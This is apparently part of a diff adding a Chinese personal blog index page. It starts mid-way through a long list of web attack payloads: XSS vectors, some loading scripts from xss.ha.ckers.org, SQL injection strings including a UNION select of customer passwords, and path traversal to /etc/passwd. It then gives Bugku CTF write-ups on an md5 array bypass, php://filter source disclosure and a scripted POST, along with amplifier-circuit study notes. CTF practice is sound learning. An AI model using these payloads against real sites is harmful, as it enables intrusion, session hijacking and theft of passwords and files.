class="line">%3Cscript%3Ealert(document.domain);%3C/script%3E&amp;SESSION_ID=&#123;SESSION_ID&#125;&amp;SESSION_ID=</span><br><span class="line">1%20union%20all%20select%20pass,0,0,0,0%20from%20customers%20where%20fname=</span><br><span class="line">http://www.cnblogs.com/http://www.cnblogs.com/http://www.cnblogs.com/http://www.cnblogs.com/etc/passwd</span><br><span class="line">..\..\..\..\..\..\..\..\windows\system.ini</span><br><span class="line">\..\..\..\..\..\..\..\..\windows\system.ini</span><br><span class="line">&apos;&apos;;!--&quot;&lt;XSS&gt;=&amp;&#123;()&#125;</span><br><span class="line">&lt;IMG src=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br><span class="line">&lt;IMG src=javascript:alert(&apos;XSS&apos;)&gt;</span><br><span class="line">&lt;IMG src=JaVaScRiPt:alert(&apos;XSS&apos;)&gt;</span><br><span class="line">&lt;IMG src=JaVaScRiPt:alert(&quot;XSS&quot;)&gt;</span><br><span class="line">&lt;IMG src=javascript:alert(&apos;XSS&apos;)&gt;</span><br><span class="line">&lt;IMG src=javascript:alert(&apos;XSS&apos;)&gt;</span><br><span class="line">&lt;IMG src=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;</span><br><span class="line">&lt;IMG src=&quot;jav ascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br><span class="line">&lt;IMG src=&quot;jav ascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br><span class="line">&lt;IMG src=&quot;jav ascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br><span class="line">&quot;&lt;IMG src=java\0script:alert(\&quot;XSS\&quot;)&gt;&quot;;&apos; &gt; out</span><br><span class="line">&lt;IMG src=&quot; javascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br><span class="line">&lt;SCRIPT&gt;a=/XSS/alert(a.source)&lt;/SCRIPT&gt;</span><br><span class="line">&lt;BODY BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;</span><br><span class="line">&lt;BODY ONLOAD=alert(&apos;XSS&apos;)&gt;</span><br><span class="line">&lt;IMG DYNSRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;</span><br><span class="line">&lt;IMG LOWSRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;</span><br><span class="line">&lt;BGSOUND src=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br><span class="line">&lt;br size=&quot;&amp;&#123;alert(&apos;XSS&apos;)&#125;&quot;&gt;</span><br><span class="line">&lt;LAYER src=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/layer&gt;</span><br><span class="line">&lt;LINK REL=&quot;stylesheet&quot; href=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br><span class="line">&lt;IMG src=&apos;vbscript:msgbox(&quot;XSS&quot;)&apos;&gt;</span><br><span class="line">&lt;IMG src=&quot;mocha:[code]&quot;&gt;</span><br><span class="line">&lt;IMG src=&quot;livescript:[code]&quot;&gt;</span><br><span class="line">&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=javascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br><span class="line">&lt;IFRAME src=javascript:alert(&apos;XSS&apos;)&gt;&lt;/IFRAME&gt;</span><br><span class="line">&lt;FRAMESET&gt;&lt;FRAME src=javascript:alert(&apos;XSS&apos;)&gt;&lt;/FRAME&gt;&lt;/FRAMESET&gt;</span><br><span class="line">&lt;TABLE BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;</span><br><span class="line">&lt;DIV STYLE=&quot;background-image: url(javascript:alert(&apos;XSS&apos;))&quot;&gt;</span><br><span class="line">&lt;DIV STYLE=&quot;behaviour: url(&apos;http://www.how-to-hack.org/exploit.html&apos;);&quot;&gt;</span><br><span class="line">&lt;DIV STYLE=&quot;width: expression(alert(&apos;XSS&apos;));&quot;&gt;</span><br><span class="line">&lt;STYLE&gt;@im\port&apos;\ja\vasc\ript:alert(&quot;XSS&quot;)&apos;;&lt;/STYLE&gt;</span><br><span class="line">&lt;IMG STYLE=&apos;xss:expre\ssion(alert(&quot;XSS&quot;))&apos;&gt;</span><br><span class="line">&lt;STYLE TYPE=&quot;text/javascript&quot;&gt;alert(&apos;XSS&apos;);&lt;/STYLE&gt;</span><br><span class="line">&lt;STYLE TYPE=&quot;text/css&quot;&gt;.XSS&#123;background-image:url(&quot;javascript:alert(&apos;XSS&apos;)&quot;);&#125;&lt;/STYLE&gt;&lt;A class=&quot;XSS&quot;&gt;&lt;/A&gt;</span><br><span class="line">&lt;STYLE type=&quot;text/css&quot;&gt;BODY&#123;background:url(&quot;javascript:alert(&apos;XSS&apos;)&quot;)&#125;&lt;/STYLE&gt;</span><br><span class="line">&lt;BASE href=&quot;javascript:alert(&apos;XSS&apos;);//&quot;&gt;</span><br><span class="line">getURL(&quot;javascript:alert(&apos;XSS&apos;)&quot;)</span><br><span class="line">a=&quot;get&quot;;b=&quot;URL&quot;;c=&quot;javascript:&quot;;d=&quot;alert(&apos;XSS&apos;);&quot;;eval(a+b+c+d);</span><br><span class="line">&lt;XML src=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br><span class="line">&quot;&gt; &lt;BODY ONLOAD=&quot;a();&quot;&gt;&lt;SCRIPT&gt;function a()&#123;alert(&apos;XSS&apos;);&#125;&lt;/SCRIPT&gt;&lt;&quot;</span><br><span class="line">&lt;SCRIPT src=&quot;http://xss.ha.ckers.org/xss.jpg&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line">&lt;IMG src=&quot;javascript:alert(&apos;XSS&apos;)&quot;</span><br><span class="line">&lt;!--#exec cmd=&quot;/bin/echo &apos;&lt;SCRIPT SRC&apos;&quot;--&gt;&lt;!--#exec cmd=&quot;/bin/echo &apos;=http://xss.ha.ckers.org/a.js&gt;&lt;/SCRIPT&gt;&apos;&quot;--&gt;</span><br><span class="line">&lt;IMG src=&quot;http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode&quot;&gt;</span><br><span class="line">&lt;SCRIPT a=&quot;&gt;&quot; src=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line">&lt;SCRIPT =&quot;&gt;&quot; src=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line">&lt;SCRIPT a=&quot;&gt;&quot; &apos;&apos; src=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line">&lt;SCRIPT &quot;a=&apos;&gt;&apos;&quot; src=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line">&lt;SCRIPT&gt;document.write(&quot;&lt;SCRI&quot;);&lt;/SCRIPT&gt;PT src=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line">&lt;A href=http://www.gohttp://www.google.com/ogle.com/&gt;link&lt;/A&gt;</span><br><span class="line">admin&apos;--</span><br><span class="line">&apos; or 0=0 --</span><br><span class="line">&quot; or 0=0 --</span><br><span class="line">or 0=0 --</span><br><span class="line">&apos; or 0=0 #</span><br><span class="line">&quot; or 0=0 #</span><br><span class="line">or 0=0 #</span><br><span class="line">&apos; or &apos;x&apos;=&apos;x</span><br><span class="line">&quot; or &quot;x&quot;=&quot;x</span><br><span class="line">&apos;) or (&apos;x&apos;=&apos;x</span><br><span class="line">&apos; or 1=1--</span><br><span class="line">&quot; or 1=1--</span><br><span class="line">or 1=1--</span><br><span class="line">&apos; or a=a--</span><br><span class="line">&quot; or &quot;a&quot;=&quot;a</span><br><span class="line">&apos;) or (&apos;a&apos;=&apos;a</span><br><span class="line">&quot;) or (&quot;a&quot;=&quot;a</span><br><span class="line">hi&quot; or &quot;a&quot;=&quot;a</span><br><span class="line">hi&quot; or 1=1 --</span><br><span class="line">hi&apos; or 1=1 --</span><br><span class="line">hi&apos; or &apos;a&apos;=&apos;a</span><br><span class="line">hi&apos;) or (&apos;a&apos;=&apos;a</span><br><span class="line">hi&quot;) or (&quot;a&quot;=&quot;a[/code]</span><br></pre></td></tr></table></figure>
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">web</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/unln1999.github.io/2019/10/07/DVWAXSS/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-bk19-备份是个好习惯" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/unln1999.github.io/2019/10/07/bk19-备份是个好习惯/">Bugku 2019/10/7 备份是个好习惯</a>
+    </h1>
+  
+
+        
+        <a href="/unln1999.github.io/2019/10/07/bk19-备份是个好习惯/" class="archive-article-date">
+  	<time datetime="2019-10-06T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-07</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>文件包含漏洞：一些服务器脚本的函数会引入本地文件、远程文件，如果没有经过合理的校验，可能会操作预想之外的文件，导致文件泄露、代码注入等情况。<br>涉及的函数有：include()、include_once()、require()、require_once()。<br>当动态地包含文件时会产生文件包含漏洞。</p>
+<h2 id="进入题目页面"><a href="#进入题目页面" class="headerlink" title="进入题目页面"></a>进入题目页面</h2><p>显示“d41d8cd98f00b204e9800998ecf8427ed41d8cd98f00b204e9800998ecf8427e”<br>刚好64位，是md5加密，解密后为：[空密码]/[Empty String]。</p>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>根据这个题目的意思，首先扫描一下目录，发现只有index.php。<br>试一下能不能直接访问bak文件。</p>
+<h2 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h2><p>加.bak。<br>edge里会打开，chorome会下载。<br>内容为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * Created by PhpStorm.</span><br><span class="line"> * User: Norse</span><br><span class="line"> * Date: 2017/8/6</span><br><span class="line"> * Time: 20:22</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">include_once &quot;flag.php&quot;;</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = strstr($_SERVER[&apos;REQUEST_URI&apos;], &apos;?&apos;); //寻找？首次出现的地址，$_SERVER[&apos;REQUEST_URI&apos;]就是URL，然后找get变量。</span><br><span class="line">$str = substr($str,1); //从起始下标截取，就是除去问号</span><br><span class="line">$str = str_replace(&apos;key&apos;,&apos;&apos;,$str); 把key去掉。（因此想办法编码）</span><br><span class="line">parse_str($str); //把字符串分解为变量，有点像有个东西，一下子记不起来了</span><br><span class="line">echo md5($key1);</span><br><span class="line"></span><br><span class="line">echo md5($key2);</span><br><span class="line">if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123; //还要不等，迷惑</span><br><span class="line">    echo $flag.&quot;取得flag&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>利用”kekeyy”绕过对key的频率。<br>然后md5函数不能处理数组，返回null。<br>还有一个==比较漏洞，md5加密值为0e开头的话会被认为是科学计数法。    </p>
+<p>选择第一种。<br>URL输入：123.206.87.240:8002/web16/index.php?kekeyy1[]=1&amp;kekeyy2[]=2<br>得到flag。</p>
+<h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><ol>
+<li><strong>文件包含漏洞</strong></li>
+<li><strong>备份文件</strong></li>
+<li><strong>md5()</strong></li>
+<li><strong>==比较漏洞</strong></li>
+<li><strong>str_replace绕过</strong></li>
+</ol>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">bugku</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/unln1999.github.io/2019/10/07/bk19-备份是个好习惯/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-md三种组态" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/unln1999.github.io/2019/10/07/md三种组态/">放大电路的三种组态</a>
+    </h1>
+  
+
+        
+        <a href="/unln1999.github.io/2019/10/07/md三种组态/" class="archive-article-date">
+  	<time datetime="2019-10-06T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-07</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="共射基本放大电路——-集极放大器"><a href="#共射基本放大电路——-集极放大器" class="headerlink" title="共射基本放大电路—— 集极放大器"></a>共射基本放大电路—— 集极放大器</h1><p>输入：基极 输出：集极</p>
+<p>有两种，一种是固定偏置，一种是分压偏置。（区别就是有没有$R_{b2}$）</p>
+<h2 id="固定偏置"><a href="#固定偏置" class="headerlink" title="固定偏置"></a>固定偏置</h2><p>$A_u=-\frac{βR’<em>L}}{r</em>{be}}$ <strong>反向放大</strong><br>$R_i=R_b//r_{be}$<br>$R_o=R_c$</p>
+<h2 id="分压偏置"><a href="#分压偏置" class="headerlink" title="分压偏置"></a>分压偏置</h2><p>$A_u=-\frac{βR’<em>L}}{r</em>{be}}$ <strong>反向放大</strong><br>$R_i=R_{b1}//R_{b2}//r_{be}$<br>$R_o=R_c$</p>
+<p>进一步探究——旁路电容$C_e$对电压放大倍数的影响和静态工作点稳定原理。<br>1.主要是有无的问题，去掉旁路电容，$R_e$要被包含于$U_i$里，$U_i$增大，放大倍数减小。因此，添加旁路电容是为了增大放大倍数。<br>2.T↑→$I_c$↑（书第46页，穿透电流增强）→$I_e$↑（jjshoot）→$U_E$↑（这个等于射极电流乘射极电阻）→$U_{BE}$↓→$I_B$↓→$I_C$↓</p>
+<hr>
+<h1 id="共集基本放大电路——-射集跟随器"><a href="#共集基本放大电路——-射集跟随器" class="headerlink" title="共集基本放大电路—— 射集跟随器"></a>共集基本放大电路—— 射集跟随器</h1><p>输入：基极 输出：射极</p>
+<p>$A_u=-\frac{(1+β)R’<em>L}}{r</em>{be}+(1+β)R’<em>L}$ <strong>正向放大</strong><br>$R_i=R</em>{b}//r_{be}+(1+β)R’L$<br>$R_o=\frac{R_s//R_b+r_{be}}{1+β}//R_e$</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">模电</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/unln1999.github.io/2019/10/07/md三种组态/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-bk18-flag在index里" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/unln1999.github.io/2019/10/06/bk18-flag在index里/">Bugku 2019/10/6 flag在index里</a>
+    </h1>
+  
+
+        
+        <a href="/unln1999.github.io/2019/10/06/bk18-flag在index里/" class="archive-article-date">
+  	<time datetime="2019-10-05T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-06</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="进入题目页面"><a href="#进入题目页面" class="headerlink" title="进入题目页面"></a>进入题目页面</h2><p>只有一个链接，<br>点击之后显示test5.</p>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>点击后的url里有file字眼，存在文件包含漏洞。<br>这里要用到“file=php://filter/read=convert.base64-encode/resource=index.php”<br>它传递了file关键字的get参数，php://是一种协议名称，php://filter/则是一种访问本地文件的协议，convert.base64-encode将内容编码以免执行。</p>
+<h2 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h2><p>传递file参数为：<br>file=php://filter/read=convert.base64-encode/resource=index.php<br>回车得到base64编码后的index.php【划重点，我回车之后就无法访问了，不知道为啥】<br>解码得到falg。</p>
+<h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><ol>
+<li><strong>php://协议</strong></li>
+</ol>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">bugku</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/unln1999.github.io/2019/10/06/bk18-flag在index里/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-md放大电路分析" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/unln1999.github.io/2019/10/06/md放大电路分析/">基本放大电路分析</a>
+    </h1>
+  
+
+        
+        <a href="/unln1999.github.io/2019/10/06/md放大电路分析/" class="archive-article-date">
+  	<time datetime="2019-10-05T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-06</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>所有对放大电路的分析都包括静态分析和动态分析，静态工作点是只有直流电源工作时的情况。<br>确定了好的静态工作点，保证动态时晶体管工作在放大区，也就是射极正偏、集极反偏。</p>
+<h1 id="图解法（略作了解）"><a href="#图解法（略作了解）" class="headerlink" title="图解法（略作了解）"></a>图解法（略作了解）</h1><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a><font color="blue">静态分析</font></h2><p>①戴维宁等效输入电源</p>
+<p>②在基极回路列写KVL方程得到输入负载线<br>③作图得到$U_{BEQ}$和$I_{BQ}$</p>
+<p>④在集极回路列写KVL方程，射极电流和集极电流做一个近似。<br>⑤作图得到$U_{CEQ}$和$I_{CQ}$</p>
+<hr>
+<p><strong>可以确定的定性分析：</strong></p>
+<ul>
+<li>地输电阻增加，静态工作点右移。</li>
+<li>地源电阻增加，静态工作点左移。</li>
+<li>基极电阻增加，静态工作点左移。</li>
+<li>Vcc增加，静态工作点右移。</li>
+</ul>
+<hr>
+<h2 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a><font color="orange">动态分析</font></h2><p>①求输出电阻<br>②过静态工作点，作斜率为$-\frac{1}{R^’_L}$的输出负载线。<br>③由Ube确定ib，由ib确定ic，由ic确定Uce。</p>
+<h1 id="微变等效电路法"><a href="#微变等效电路法" class="headerlink" title="微变等效电路法"></a>微变等效电路法</h1><p>基区体电阻为300Ω，UT约为26mV<br>简化H参数等效电路</p>
+<ul>
+<li>h11：输入电阻$rbe=<font color="red">r_{bb’}+(1+β)U_T/I_{EQ}$</font></li>
+<li>h12：电压反馈系数，忽略不计</li>
+<li>h21：β</li>
+<li>h22：1/rce，忽略不计</li>
+</ul>
+<p><strong>要记住简化H参数等效电路</strong></p>
+<h2 id="静态分析-1"><a href="#静态分析-1" class="headerlink" title="静态分析"></a><font color="blue">静态分析</font></h2><p>①戴维宁等效输入电源</p>
+<p><strong>计算法：（先求$I_B$）</strong><br>②<font color="red">$I_B=\frac{V’_{CC}-0.7}{R’_b+(1+β)R_e}$</font></p>
+<p><strong>估算法：（先求$I_E$）</strong><br><font color="red">$I_C$约等于$I_E=\frac{U_B-U_{BE}}{R_e}$</font><br><font color="red">$I_B=\frac{I_E}{1+β}$</font></p>
+<p>③<font color="red">$U_{CE}=V_{CC}-I_C(R_c+R_e)$</font></p>
+<h2 id="动态分析-1"><a href="#动态分析-1" class="headerlink" title="动态分析"></a><font color="orange">动态分析</font></h2><p>输入电压：$U_i=I_br_{be}$<br>输出电压：$U_o=-I_cR’<em>L$<br>放大倍数Au为 <font color="red">$-\frac{βR’_L}{r</font></em>{be}}$</p>
+<p>输入电阻：$R’<em>b//r</em>{be}$<br>输出电阻：$R_c$</p>
+<hr>
+<h2 id="可以确定的定性分析："><a href="#可以确定的定性分析：" class="headerlink" title="可以确定的定性分析："></a><strong>可以确定的定性分析：</strong></h2>
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">模电</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/unln1999.github.io/2019/10/06/md放大电路分析/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-bk17-速度要快" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/unln1999.github.io/2019/10/05/bk17-速度要快/">Bugku 2019/10/5 速度要快</a>
+    </h1>
+  
+
+        
+        <a href="/unln1999.github.io/2019/10/05/bk17-速度要快/" class="archive-article-date">
+  	<time datetime="2019-10-04T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-05</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="进入题目页面"><a href="#进入题目页面" class="headerlink" title="进入题目页面"></a>进入题目页面</h2><p>提示你要速度要快。</p>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>查看源码，说让你用post方法传递一个叫margin的量。<br>它的值是多少呢？<br>如果随便给个值，返回结果是”我都说了让你快点。。。”<br>接下来查看html响应头，发现里面有flag。然后只有数字、字母、+、=,是base64加密，加密得到“flag”，然后对这个“flag”再进行一次解密，发现可以解密。<br>把这个值作为margin的值。</p>
+<h2 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h2><p>写一个快速反弹post的python脚本，内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import requests #调用requests库</span><br><span class="line">import re</span><br><span class="line">import base64</span><br><span class="line">s = requests.session() #创建会话对象</span><br><span class="line">r = s.get(&quot;http://123.206.87.240:8002/web6/&quot;)#会话对象的方法,向url发送get请求</span><br><span class="line"></span><br><span class="line">#第一种</span><br><span class="line">#flag = r.headers[&apos;flag&apos;]</span><br><span class="line">#flag = base64.b64decode(flag)</span><br><span class="line">#flag = flag.decode()</span><br><span class="line">#flag = base64.b64decode(flag.split(&quot;:&quot;)[1])</span><br><span class="line">#data = &#123;&quot;margin&quot;: flag&#125;</span><br><span class="line"></span><br><span class="line">#第二种</span><br><span class="line">#flag = re.search(r&quot;6LeR55qE6L\+Y5LiN6ZSZ77yM57uZ5L2gZmxhZ\+WQpzogT\w&#123;10&#125;=&quot;,str(r.headers))</span><br><span class="line">#flag = base64.b64decode(flag.group(0))</span><br><span class="line">#flag = re.search(r&quot;\w&#123;7&#125;[\w =]&quot;,str(flag))</span><br><span class="line">#flag = base64.b64decode(flag.group(0))</span><br><span class="line">#data = &#123;&quot;margin&quot;: flag&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r= s.post(&quot;http://123.206.87.240:8002/web6/&quot;,data)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
+
+<p>有两种方式去解密margin的值，第一种是网上常规的，第二种是我用正则表达式写的。<br>在powershell里运行py文件（使用的时候选择一种方法去掉语句的注释）。<br>即可得到flag。</p>
+<h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><ol>
+<li><strong>base64库</strong></li>
+<li><strong>base64多次加密</strong></li>
+<li>requests库</li>
+<li>基于python的快速反弹</li>
+<li>正则表达式</li>
+<li><strong>split方法</strong></li>
+<li>decode</li>
+<li>html响应头</li>
+</ol>
+<p>做了两道快速反弹post的题之后也可以意识到，提交post值还可以用py脚本。</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">bugku</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/unln1999.github.io/2019/10/05/bk17-速度要快/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
